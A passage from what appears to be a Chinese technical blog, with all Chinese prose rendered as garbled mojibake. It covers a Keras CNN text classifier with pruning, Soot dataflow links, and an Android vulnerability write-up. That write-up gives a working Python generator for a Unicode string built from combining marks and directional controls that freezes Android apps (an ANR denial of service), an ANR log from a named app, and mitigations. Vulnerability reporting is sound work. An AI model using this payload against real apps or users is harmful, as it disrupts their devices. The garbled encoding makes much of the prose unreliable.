class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><strong>åŠŸèƒ½</strong>ï¼šå°†æ–‡æœ¬æ•°æ®è½¬æ¢ä¸ºæ¨¡å‹å¯å¤„ç†çš„æ•°å€¼å½¢å¼ã€‚</li><li><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼šä½¿ç”¨å­—ç¬¦çº§çš„ç‹¬çƒ­ç¼–ç ï¼ˆone-hot encodingï¼‰ï¼Œå°†æ¯ä¸ªå­—ç¬¦æ˜ å°„åˆ°ä¸€ä¸ªå”¯ä¸€çš„ç´¢å¼•ã€‚é™åˆ¶æœ€å¤§é•¿åº¦ä¸º50ï¼Œè¶…å‡ºéƒ¨åˆ†æˆªæ–­ï¼Œä¸è¶³éƒ¨åˆ†è¡¥é›¶ã€‚è¿™ç§ç¼–ç æ–¹å¼ä¿ç•™äº†å­—ç¬¦çš„é¡ºåºä¿¡æ¯ï¼ŒåŒæ—¶å°†æ–‡æœ¬è½¬æ¢ä¸ºå›ºå®šé•¿åº¦çš„æ•°å€¼çŸ©é˜µã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">np.random.seed(<span class="number">200</span>)</span><br><span class="line">np.random.shuffle(proData)</span><br><span class="line">np.random.seed(<span class="number">200</span>)</span><br><span class="line">np.random.shuffle(label)</span><br><span class="line">label = np.asarray(label).astype(<span class="string">&#x27;float32&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>åŠŸèƒ½</strong>ï¼šæ‰“ä¹±æ•°æ®é¡ºåºï¼Œé¿å…æ¨¡å‹å¯¹æ•°æ®é¡ºåºçš„ä¾èµ–ã€‚</li><li><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼šä½¿ç”¨ç›¸åŒçš„éšæœºç§å­ç¡®ä¿æ•°æ®å’Œæ ‡ç­¾çš„æ‰“ä¹±é¡ºåºä¸€è‡´ã€‚å°†æ ‡ç­¾è½¬æ¢ä¸ºæµ®ç‚¹å‹æ•°ç»„ï¼Œé€‚åº”æ¨¡å‹çš„è¾“å‡ºå±‚è®¾è®¡ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Conv1D, MaxPooling1D, GlobalMaxPooling1D, Dense</span><br><span class="line"></span><br><span class="line">model = Sequential()</span><br><span class="line">model.add(Conv1D(<span class="number">3</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, input_shape=(max_length, <span class="number">101</span>)))</span><br><span class="line">model.add(MaxPooling1D(<span class="number">2</span>))</span><br><span class="line">model.add(Conv1D(<span class="number">2</span>, <span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(GlobalMaxPooling1D())</span><br><span class="line">model.add(Dense(<span class="number">1</span>, activation=<span class="string">&#x27;sigmoid&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li><strong>åŠŸèƒ½</strong>ï¼šæ„å»ºä¸€ä¸ªç”¨äºæ–‡æœ¬åˆ†ç±»çš„å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰ã€‚</li><li><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼š<ul><li><strong>å·ç§¯å±‚ï¼ˆConv1Dï¼‰</strong>ï¼šæå–æ–‡æœ¬çš„å±€éƒ¨ç‰¹å¾ã€‚ç¬¬ä¸€å±‚ä½¿ç”¨3ä¸ªæ»¤æ³¢å™¨ï¼Œçª—å£å¤§å°ä¸º3ï¼›ç¬¬äºŒå±‚ä½¿ç”¨2ä¸ªæ»¤æ³¢å™¨ï¼Œçª—å£å¤§å°ä¸º2ã€‚æ¿€æ´»å‡½æ•°ä½¿ç”¨ReLUï¼Œå¢åŠ æ¨¡å‹çš„éçº¿æ€§è¡¨è¾¾èƒ½åŠ›ã€‚</li><li><strong>æ± åŒ–å±‚ï¼ˆMaxPooling1Dï¼‰</strong>ï¼šé™ä½æ•°æ®ç»´åº¦ï¼Œå‡å°‘è®¡ç®—é‡ï¼ŒåŒæ—¶ä¿ç•™é‡è¦ç‰¹å¾ã€‚</li><li><strong>å…¨å±€æ± åŒ–å±‚ï¼ˆGlobalMaxPooling1Dï¼‰</strong>ï¼šå°†æ¯ä¸ªç‰¹å¾é€šé“çš„æœ€å¤§å€¼æå–å‡ºæ¥ï¼Œè¿›ä¸€æ­¥é™ä½ç»´åº¦ã€‚</li><li><strong>å…¨è¿æ¥å±‚ï¼ˆDenseï¼‰</strong>ï¼šè¾“å‡ºå±‚ä½¿ç”¨sigmoidå‡½æ•°ï¼Œå°†æ¨¡å‹çš„è¾“å‡ºæ˜ å°„åˆ°[0,1]åŒºé—´ï¼Œé€‚ç”¨äºäºŒåˆ†ç±»ä»»åŠ¡ã€‚</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>, loss=<span class="string">&#x27;binary_crossentropy&#x27;</span>, metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">history = model.fit(proData, label, epochs=<span class="number">50</span>, batch_size=<span class="number">256</span>, validation_split=<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>åŠŸèƒ½</strong>ï¼šç¼–è¯‘æ¨¡å‹å¹¶è¿›è¡Œè®­ç»ƒã€‚</li><li><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼š<ul><li><strong>ä¼˜åŒ–å™¨ï¼ˆAdamï¼‰</strong>ï¼šè‡ªé€‚åº”å­¦ä¹ ç‡ä¼˜åŒ–ç®—æ³•ï¼Œèƒ½å¤Ÿè‡ªåŠ¨è°ƒæ•´æ¯ä¸ªå‚æ•°çš„å­¦ä¹ ç‡ï¼Œæé«˜è®­ç»ƒæ•ˆç‡å’Œæ¨¡å‹æ€§èƒ½ã€‚</li><li><strong>æŸå¤±å‡½æ•°ï¼ˆbinary_crossentropyï¼‰</strong>ï¼šé€‚ç”¨äºäºŒåˆ†ç±»é—®é¢˜çš„æŸå¤±å‡½æ•°ï¼Œè¡¡é‡æ¨¡å‹é¢„æµ‹ä¸çœŸå®æ ‡ç­¾ä¹‹é—´çš„å·®å¼‚ã€‚</li><li><strong>è®­ç»ƒå‚æ•°</strong>ï¼šè®¾ç½®50ä¸ªè®­ç»ƒå‘¨æœŸï¼Œæ‰¹é‡å¤§å°ä¸º256ï¼ŒéªŒè¯é›†æ¯”ä¾‹ä¸º20%ï¼Œåœ¨æ¯ä¸ªå‘¨æœŸç»“æŸåè¯„ä¼°æ¨¡å‹åœ¨éªŒè¯é›†ä¸Šçš„è¡¨ç°ã€‚</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.save(<span class="string">&#x27;my_model.h5&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>åŠŸèƒ½</strong>ï¼šä¿å­˜è®­ç»ƒå¥½çš„æ¨¡å‹ï¼Œä¾¿äºåç»­ä½¿ç”¨å’Œéƒ¨ç½²ã€‚</li><li><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼šä½¿ç”¨Kerasçš„æ¨¡å‹ä¿å­˜åŠŸèƒ½ï¼Œå°†æ¨¡å‹çš„ç»“æ„å’Œæƒé‡ä¿å­˜åˆ°HDF5æ–‡ä»¶ä¸­ã€‚åŠ è½½æ—¶å¯ä»¥ç›´æ¥è¿˜åŸæ¨¡å‹çŠ¶æ€ï¼Œæ— éœ€é‡æ–°è®­ç»ƒã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> kerassurgeon.operations <span class="keyword">import</span> delete_channels</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cut_cnn_low</span>(<span class="params">model, num</span>):</span><br><span class="line">    cnn_layer = model.get_layer(index=num)</span><br><span class="line">    weight_all = cnn_layer.get_weights()</span><br><span class="line">    weight_filter = weight_all[<span class="number">0</span>]</span><br><span class="line">    num_filter = weight_filter.shape[-<span class="number">1</span>]</span><br><span class="line">    sum_filter = np.zeros([num_filter])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_filter):</span><br><span class="line">        sum_filter[i] = np.<span class="built_in">sum</span>(np.<span class="built_in">abs</span>(weight_filter[:, :, i]))</span><br><span class="line">    num_small = np.argmin(sum_filter)</span><br><span class="line">    new_model = delete_channels(model, cnn_layer, [num_small], copy=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> new_model</span><br><span class="line"></span><br><span class="line">new_model = cut_cnn_low(model, <span class="number">0</span>)</span><br><span class="line">new_model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>, loss=<span class="string">&#x27;binary_crossentropy&#x27;</span>, metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">new_model.fit(proData, label, epochs=<span class="number">10</span>, batch_size=<span class="number">256</span>, validation_split=<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>åŠŸèƒ½</strong>ï¼šå¯¹æ¨¡å‹è¿›è¡Œå‰ªæï¼Œä¼˜åŒ–æ¨¡å‹ç»“æ„ï¼Œå‡å°‘è®¡ç®—é‡ã€‚</li><li><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼š<ul><li><strong>å‰ªæç­–ç•¥</strong>ï¼šåˆ é™¤å·ç§¯å±‚ä¸­æƒé‡ç»å¯¹å€¼å’Œæœ€å°çš„å·ç§¯æ ¸ï¼Œå‡å°‘æ¨¡å‹çš„å‚æ•°æ•°é‡ã€‚</li><li><strong>æ¨¡å‹é‡å»º</strong>ï¼šä½¿ç”¨kerassurgeonåº“çš„delete_channelså‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„æ¨¡å‹ï¼Œç»§æ‰¿åŸå§‹æ¨¡å‹çš„ç»“æ„å’Œæƒé‡ï¼Œä½†ç§»é™¤äº†æŒ‡å®šçš„å·ç§¯æ ¸ã€‚</li><li><strong>é‡æ–°è®­ç»ƒ</strong>ï¼šå¯¹å‰ªæåçš„æ¨¡å‹è¿›è¡Œé‡æ–°è®­ç»ƒï¼Œæ¢å¤æ¨¡å‹æ€§èƒ½ï¼ŒåŒæ—¶ä¿æŒæ¨¡å‹çš„è½»é‡åŒ–ã€‚</li></ul></li></ul><h2 id="åŸºäºSootçš„æ•°æ®æµåˆ†æ"><a href="#åŸºäºSootçš„æ•°æ®æµåˆ†æ" class="headerlink" title="åŸºäºSootçš„æ•°æ®æµåˆ†æ"></a>åŸºäºSootçš„æ•°æ®æµåˆ†æ</h2><p><a href="https://bbs.huaweicloud.com/blogs/308700">https://bbs.huaweicloud.com/blogs/308700</a><br><a href="https://fynch3r.github.io/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/">https://fynch3r.github.io/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/</a><br><a href="https://blog.csdn.net/m0_51641604/article/details/140240239#">https://blog.csdn.net/m0_51641604/article/details/140240239#</a></p><h2 id="Android-CNVD"><a href="#Android-CNVD" class="headerlink" title="Android CNVD"></a>Android CNVD</h2><h3 id="ğŸ§ -ä¸€ã€è„šæœ¬æ ¸å¿ƒåŠŸèƒ½åˆ†æ"><a href="#ğŸ§ -ä¸€ã€è„šæœ¬æ ¸å¿ƒåŠŸèƒ½åˆ†æ" class="headerlink" title="ğŸ§  ä¸€ã€è„šæœ¬æ ¸å¿ƒåŠŸèƒ½åˆ†æ"></a>ğŸ§  ä¸€ã€è„šæœ¬æ ¸å¿ƒåŠŸèƒ½åˆ†æ</h3><h4 id="ğŸ“œ-è„šæœ¬åˆ†è§£åˆ†æï¼š"><a href="#ğŸ“œ-è„šæœ¬åˆ†è§£åˆ†æï¼š" class="headerlink" title="ğŸ“œ è„šæœ¬åˆ†è§£åˆ†æï¼š"></a>ğŸ“œ è„šæœ¬åˆ†è§£åˆ†æï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyperclip</span><br><span class="line"></span><br><span class="line">n=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥é•¿åº¦:&quot;</span>))  <span class="comment"># ç”¨æˆ·è¾“å…¥æ§åˆ¶ç”Ÿæˆå­—ç¬¦é‡å¤çš„æ•°é‡</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å«æœ‰ RTL æ§åˆ¶ç¬¦ã€å˜ä½“é€‰æ‹©å™¨ç­‰</span></span><br><span class="line">a1=<span class="string">&quot;\u0f19\u0f19\u0f87\u0f87\ufb50\u0020\u093a\u200d\ufb50\u064d\u0651\u0636\u0020\u206a&quot;</span></span><br><span class="line">a2=<span class="string">&quot;\u0f19\u0f19\u0f87\u0f87\ufb50\u0020\u093a\u200d\ufb50\u064d\u0651\u0636\u000d\u000a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½•è§çš„å åŠ å­—ç¬¦ï¼ˆUnicode Combining Marksï¼‰</span></span><br><span class="line">a01=<span class="string">&quot;\u0737&quot;</span>  <span class="comment"># Syriac Abbreviation Mark</span></span><br><span class="line">a02=<span class="string">&quot;\u0736&quot;</span>  <span class="comment"># Syriac Oblique Line Above</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»„åˆæ„é€ å­—ç¬¦ä¸²å¹¶å¤åˆ¶</span></span><br><span class="line">pyperclip.copy(<span class="string">f&quot;<span class="subst">&#123;a1&#125;</span><span class="subst">&#123;a01*n&#125;</span><span class="subst">&#123;a02*n&#125;</span><span class="subst">&#123;a2&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h3 id="ğŸš¨-äºŒã€è¿™æ®µå­—ç¬¦ä¸ºä»€ä¹ˆä¼šå¯¼è‡´-Android-APP-å¡é¡¿ç”šè‡³å´©æºƒï¼Ÿ"><a href="#ğŸš¨-äºŒã€è¿™æ®µå­—ç¬¦ä¸ºä»€ä¹ˆä¼šå¯¼è‡´-Android-APP-å¡é¡¿ç”šè‡³å´©æºƒï¼Ÿ" class="headerlink" title="ğŸš¨ äºŒã€è¿™æ®µå­—ç¬¦ä¸ºä»€ä¹ˆä¼šå¯¼è‡´ Android APP å¡é¡¿ç”šè‡³å´©æºƒï¼Ÿ"></a>ğŸš¨ äºŒã€è¿™æ®µå­—ç¬¦ä¸ºä»€ä¹ˆä¼šå¯¼è‡´ Android APP å¡é¡¿ç”šè‡³å´©æºƒï¼Ÿ</h3><h4 id="ğŸ“Œ-1-å¤æ‚å­—ç¬¦å åŠ æ¸²æŸ“ï¼š"><a href="#ğŸ“Œ-1-å¤æ‚å­—ç¬¦å åŠ æ¸²æŸ“ï¼š" class="headerlink" title="ğŸ“Œ 1. å¤æ‚å­—ç¬¦å åŠ æ¸²æŸ“ï¼š"></a>ğŸ“Œ 1. <strong>å¤æ‚å­—ç¬¦å åŠ æ¸²æŸ“ï¼š</strong></h4><ul><li><code>\u0736</code> å’Œ <code>\u0737</code> æ˜¯ <strong>Combining Characters</strong>ï¼Œä¸ä¼šå•ç‹¬æ˜¾ç¤ºï¼Œè€Œæ˜¯å åŠ åœ¨å‰ä¸€ä¸ªå­—ç¬¦ä¸Šã€‚</li><li>å½“ä½ æŠŠå®ƒä»¬è¿ç»­å åŠ  <code>n</code> æ¬¡ï¼Œä¼šå¯¼è‡´ï¼š<ul><li><strong>ä¸€ä¸ªå­—ç¬¦ä¸Šå åŠ å‡ åå±‚è£…é¥°ï¼ˆå¦‚æ–œçº¿ã€ç‚¹ç­‰ï¼‰</strong></li><li>Android ç³»ç»Ÿå’Œå­—ä½“æ¸²æŸ“å¼•æ“ï¼ˆSkiaã€HarfBuzzï¼‰åœ¨æ¸²æŸ“æ—¶éå¸¸è€—èµ„æºï¼Œå¯èƒ½ä¼šå¯¼è‡´çº¿ç¨‹é˜»å¡ã€‚</li></ul></li></ul><h4 id="ğŸ“Œ-2-å³åˆ°å·¦æ–‡æœ¬æ§åˆ¶ç¬¦-RTL-å’Œæ ¼å¼æ§åˆ¶å­—ç¬¦ï¼š"><a href="#ğŸ“Œ-2-å³åˆ°å·¦æ–‡æœ¬æ§åˆ¶ç¬¦-RTL-å’Œæ ¼å¼æ§åˆ¶å­—ç¬¦ï¼š" class="headerlink" title="ğŸ“Œ 2. å³åˆ°å·¦æ–‡æœ¬æ§åˆ¶ç¬¦ (RTL) å’Œæ ¼å¼æ§åˆ¶å­—ç¬¦ï¼š"></a>ğŸ“Œ 2. <strong>å³åˆ°å·¦æ–‡æœ¬æ§åˆ¶ç¬¦ (RTL) å’Œæ ¼å¼æ§åˆ¶å­—ç¬¦ï¼š</strong></h4><ul><li>ä¾‹å¦‚ï¼š<code>\u200d</code>ï¼ˆZero Width Joinerï¼‰, <code>\u206a</code>ï¼ˆInhibit Symmetric Swappingï¼‰</li><li>ä¼šå¹²æ‰°æ–‡æœ¬æ’ç‰ˆæ–¹å‘ã€å­—ç¬¦é¡ºåºã€åˆå­—ç­‰è¡Œä¸ºã€‚</li><li>å®‰å“å¯èƒ½ä¼šå°è¯•â€œè§£ææ–¹å‘+åˆå­—+ç»„åˆä¿®é¥°â€çš„å®Œæ•´æµç¨‹ â†’ <strong>å¯¼è‡´ Layout æˆ– MeasureText é˜¶æ®µè¶…æ—¶</strong>ã€‚</li></ul><h4 id="ğŸ“Œ-3-æ··åˆè„šæœ¬å¼•èµ·çš„å­—ä½“-Fallbackï¼š"><a href="#ğŸ“Œ-3-æ··åˆè„šæœ¬å¼•èµ·çš„å­—ä½“-Fallbackï¼š" class="headerlink" title="ğŸ“Œ 3. æ··åˆè„šæœ¬å¼•èµ·çš„å­—ä½“ Fallbackï¼š"></a>ğŸ“Œ 3. <strong>æ··åˆè„šæœ¬å¼•èµ·çš„å­—ä½“ Fallbackï¼š</strong></h4><ul><li>ä½ åŒæ—¶ä½¿ç”¨äº†è—æ–‡ã€å™åˆ©äºšæ–‡ã€é˜¿æ‹‰ä¼¯æ–‡ã€å¤©åŸæ–‡ï¼ˆå°åœ°è¯­ï¼‰ç­‰ã€‚</li><li>ç³»ç»Ÿåœ¨æ‰¾å­—ä½“æ—¶ä¼šé¢‘ç¹ fallbackã€load å­—å½¢ã€‚</li><li>å¤šè„šæœ¬æ··åˆ + æœªçŸ¥å­—ç¬¦å¯èƒ½å¯¼è‡´å¤§é‡â€œå­—ä½“åŒ¹é…æŸ¥æ‰¾â€ã€‚</li></ul><h4 id="ğŸ“Œ-4-æ¢è¡Œæ§åˆ¶ç¬¦æ’å…¥ï¼š"><a href="#ğŸ“Œ-4-æ¢è¡Œæ§åˆ¶ç¬¦æ’å…¥ï¼š" class="headerlink" title="ğŸ“Œ 4. æ¢è¡Œæ§åˆ¶ç¬¦æ’å…¥ï¼š"></a>ğŸ“Œ 4. <strong>æ¢è¡Œæ§åˆ¶ç¬¦æ’å…¥ï¼š</strong></h4><ul><li><code>\u000d\u000a</code> æ˜¯ CR+LFï¼Œéƒ¨åˆ†ç»„ä»¶ï¼ˆå¦‚åŸºäº EditText çš„è¾“å…¥æ¡†ï¼‰åœ¨è§£æä¸ºå¤šè¡Œæ—¶å¯èƒ½å¤±æ•ˆæˆ–è€…æ­»å¾ªç¯å¤„ç†è¾“å…¥å†…å®¹ã€‚</li></ul><hr><h3 id="ğŸ§¨-ä¸‰ã€ä¸ºä»€ä¹ˆä¼šè§¦å‘-Android-ANRï¼Ÿ"><a href="#ğŸ§¨-ä¸‰ã€ä¸ºä»€ä¹ˆä¼šè§¦å‘-Android-ANRï¼Ÿ" class="headerlink" title="ğŸ§¨ ä¸‰ã€ä¸ºä»€ä¹ˆä¼šè§¦å‘ Android ANRï¼Ÿ"></a>ğŸ§¨ ä¸‰ã€ä¸ºä»€ä¹ˆä¼šè§¦å‘ Android ANRï¼Ÿ</h3><p><strong>ANRï¼ˆApplication Not Respondingï¼‰</strong>æ˜¯ Android ç³»ç»Ÿåœ¨å‘ç°ä¸»çº¿ç¨‹ï¼ˆUIçº¿ç¨‹ï¼‰è¶…è¿‡ 5 ç§’æ— å“åº”æ—¶çš„å¼ºåˆ¶æŠ¥é”™ã€‚</p><p>åœ¨ä½ çš„åœºæ™¯ä¸­ï¼š</p><ul><li>æ–‡æœ¬æ¸²æŸ“æ˜¯åœ¨ UI çº¿ç¨‹å®Œæˆçš„ã€‚</li><li>ä½ æ„é€ çš„å­—ç¬¦ä¼šå¯¼è‡´ï¼š<ul><li>æ–‡æœ¬æµ‹é‡ï¼ˆmeasureï¼‰</li><li>æ–‡æœ¬å¸ƒå±€ï¼ˆlayoutï¼‰</li><li>å­—ä½“æŸ¥æ‰¾ä¸æ¸²æŸ“</li><li>æ§åˆ¶ç¬¦è§£é‡Š</li></ul></li></ul><p>è¿™äº›ä»»åŠ¡å…¨éƒ¨åœ¨ä¸»çº¿ç¨‹é˜»å¡è¿è¡Œï¼Œæ— æ³•å¤„ç†ç‚¹å‡»ã€æ»šåŠ¨ã€äº¤äº’ç­‰äº‹ä»¶ï¼Œäºæ˜¯ç³»ç»ŸæŠ¥ ANRï¼Œ<strong>ç”šè‡³åœ¨æŸäº›ç³»ç»Ÿç‰ˆæœ¬ä¸Šå¯¼è‡´å¡é€€æˆ–å´©æºƒ</strong>ã€‚</p><hr><h3 id="ğŸ›¡ï¸-å››ã€è§£å†³å»ºè®®ï¼ˆå¼€å‘è€…è§’åº¦ï¼‰"><a href="#ğŸ›¡ï¸-å››ã€è§£å†³å»ºè®®ï¼ˆå¼€å‘è€…è§’åº¦ï¼‰" class="headerlink" title="ğŸ›¡ï¸ å››ã€è§£å†³å»ºè®®ï¼ˆå¼€å‘è€…è§’åº¦ï¼‰"></a>ğŸ›¡ï¸ å››ã€è§£å†³å»ºè®®ï¼ˆå¼€å‘è€…è§’åº¦ï¼‰</h3><p>å¦‚æœä½ æ˜¯ APP å¼€å‘æ–¹ï¼Œåº”æ³¨æ„ï¼š</p><ol><li><p><strong>å¯¹è¾“å…¥å†…å®¹è¿›è¡Œå­—ç¬¦ç™½åå•æˆ–é»‘åå•è¿‡æ»¤</strong>ï¼š</p><ul><li>ç¦æ­¢å¤§é‡ Combining Marksã€Control Charactersã€‚</li><li>è¿‡æ»¤ <code>\u200d</code>ã€<code>\u202e</code>ã€<code>\u2066</code> ç­‰å·²çŸ¥ RTL&#x2F;LTR æ§åˆ¶ç¬¦ã€‚</li></ul></li><li><p><strong>è®¾ç½®è¾“å…¥é•¿åº¦ä¸Šé™</strong>ï¼šä¾‹å¦‚ä¸å…è®¸ç²˜è´´è¶…è¿‡ 500 å­—ç¬¦çš„æ–‡æœ¬ã€‚</p></li><li><p><strong>Android ç«¯è¾“å…¥é¢„å¤„ç†</strong>ï¼šä½¿ç”¨ <code>InputFilter</code> æˆ– <code>TextWatcher</code> å¯¹å­—ç¬¦åšæ‹¦æˆªã€‚</p></li><li><p><strong>å°½é‡é¿å…åœ¨ä¸»çº¿ç¨‹è¿›è¡Œå¤æ‚çš„ TextView è®¾ç½®</strong>ï¼Œå¯ä»¥åšå¼‚æ­¥æ£€æŸ¥ã€‚</p></li></ol><hr><h3 id="ANR-åˆ†æ"><a href="#ANR-åˆ†æ" class="headerlink" title="ANR åˆ†æ"></a>ANR åˆ†æ</h3><blockquote><p>è¯¥é—®é¢˜æ˜¯å…¸å‹çš„ <strong>Unicode æ–‡æœ¬æ¸²æŸ“æ‹’ç»æœåŠ¡æ¼æ´ï¼ˆDoSï¼‰</strong>ï¼Œé€šè¿‡æ„é€ å¤§é‡å¤æ‚çš„å­—ç¬¦ç»„åˆï¼Œä½¿ç³»ç»Ÿåœ¨ <code>Paint.getRunAdvance()</code> â†’ <code>TextLine.measureRun()</code> è¿™ä¸€è·¯å¾„ä¸­åå¤æ‰§è¡Œé«˜å¼€é”€æ“ä½œï¼Œæœ€ç»ˆå¯¼è‡´ <strong>ä¸»çº¿ç¨‹ï¼ˆUIçº¿ç¨‹ï¼‰å¡æ­»è¶…æ—¶è§¦å‘ ANR</strong>ã€‚</p></blockquote><h3 id="âœ…-1-è§¦å‘å…¥å£ï¼ˆæ—¥å¿—é¦–è¡Œï¼‰ï¼š"><a href="#âœ…-1-è§¦å‘å…¥å£ï¼ˆæ—¥å¿—é¦–è¡Œï¼‰ï¼š" class="headerlink" title="âœ… 1. è§¦å‘å…¥å£ï¼ˆæ—¥å¿—é¦–è¡Œï¼‰ï¼š"></a>âœ… 1. è§¦å‘å…¥å£ï¼ˆæ—¥å¿—é¦–è¡Œï¼‰ï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ANR in com.youxiake (com.youxiake/.ui.community.ui.CommunityForumDetailActivity)</span><br><span class="line">Reason: Input dispatching timed out</span><br></pre></td></tr></table></figure><ul><li><code>Input dispatching timed out</code> è¡¨æ˜ï¼š<ul><li><strong>ä¸»çº¿ç¨‹æ²¡æœ‰åŠæ—¶å“åº”ç”¨æˆ·äº‹ä»¶ï¼ˆä¾‹å¦‚è§¦æ‘¸ã€æ»šåŠ¨ã€é”®ç›˜è¾“å…¥ï¼‰</strong></li><li>é€šå¸¸æ˜¯å› ä¸º <strong>UI æ¸²æŸ“è¢«é˜»å¡</strong>ã€‚</li></ul></li></ul><hr><h3 id="âœ…-2-åº”ç”¨çº¿ç¨‹å †æ ˆåˆ†æï¼š"><a href="#âœ…-2-åº”ç”¨çº¿ç¨‹å †æ ˆåˆ†æï¼š" class="headerlink" title="âœ… 2. åº”ç”¨çº¿ç¨‹å †æ ˆåˆ†æï¼š"></a>âœ… 2. åº”ç”¨çº¿ç¨‹å †æ ˆåˆ†æï¼š</h3><p>å…³é”®è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">android.graphics.Paint.getRunAdvance(Paint.java:<span class="number">2969</span>)</span><br><span class="line">â†³ android.text.TextLine.getRunAdvance(TextLine.java:<span class="number">883</span>)</span><br><span class="line">â†³ android.text.TextLine.handleText(TextLine.java:<span class="number">936</span>)</span><br><span class="line">â†³ android.text.TextLine.handleRun(TextLine.java:<span class="number">1182</span>)</span><br><span class="line">â†³ android.text.TextLine.measureRun(TextLine.java:<span class="number">540</span>)</span><br><span class="line">â†³ android.text.Layout.getLineHorizontals(Layout.java:<span class="number">1260</span>)</span><br></pre></td></tr></table></figure><h4 id="ğŸ”¥-è¿™ä¸€æ®µè¯´æ˜ï¼š"><a href="#ğŸ”¥-è¿™ä¸€æ®µè¯´æ˜ï¼š" class="headerlink" title="ğŸ”¥ è¿™ä¸€æ®µè¯´æ˜ï¼š"></a>ğŸ”¥ è¿™ä¸€æ®µè¯´æ˜ï¼š</h4><ol><li>ç³»ç»Ÿæ­£åœ¨å°è¯•å¯¹æŸæ®µæ–‡æœ¬è¿›è¡Œ <strong>é€å­—ç¬¦æ’ç‰ˆå’Œæµ‹é‡ï¼ˆmeasureRunï¼‰</strong>ã€‚</li><li><code>getRunAdvance()</code> æ˜¯æµ‹é‡æ¯ä¸ªå­—ç¬¦çš„åç§»é‡ï¼ˆä½ç½®ï¼‰ï¼Œæ¶‰åŠå­—ä½“å¤„ç†ã€åˆå­—ã€æ§åˆ¶å­—ç¬¦è§£é‡Šã€‚</li><li><strong>è¿™ä¸€è¿‡ç¨‹å› ä¸ºä½ è¾“å…¥çš„å­—ç¬¦ä¸²å¤ªå¤æ‚ï¼Œæ‰§è¡Œæ—¶é—´è¿œè¶…é¢„æœŸ</strong>ï¼Œå¯¼è‡´ UI çº¿ç¨‹é˜»å¡è¶…è¿‡ 5 ç§’ã€‚</li></ol><hr><h3 id="ä½ è¾“å…¥çš„æ˜¯è¿™æ ·ä¸€ç§å­—ç¬¦ä¸²ç»“æ„ï¼š"><a href="#ä½ è¾“å…¥çš„æ˜¯è¿™æ ·ä¸€ç§å­—ç¬¦ä¸²ç»“æ„ï¼š" class="headerlink" title="ä½ è¾“å…¥çš„æ˜¯è¿™æ ·ä¸€ç§å­—ç¬¦ä¸²ç»“æ„ï¼š"></a>ä½ 